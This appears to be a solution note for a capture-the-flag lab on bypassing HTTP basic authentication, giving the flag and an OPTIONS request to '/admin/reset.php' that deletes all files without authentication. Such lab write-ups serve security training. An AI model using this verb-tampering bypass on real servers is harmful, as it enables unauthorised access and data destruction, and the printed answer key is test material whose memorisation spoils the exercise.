# Bypassing Basic Authentication
## Questions
1. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag. **Answer: HTB{4lw4y5_c0v3r_4ll_v3rb5}**
   - Try to send an OPTIONS request and it imediately works without authentication:
        ```
        OPTIONS /admin/reset.php HTTP/1.1
        ```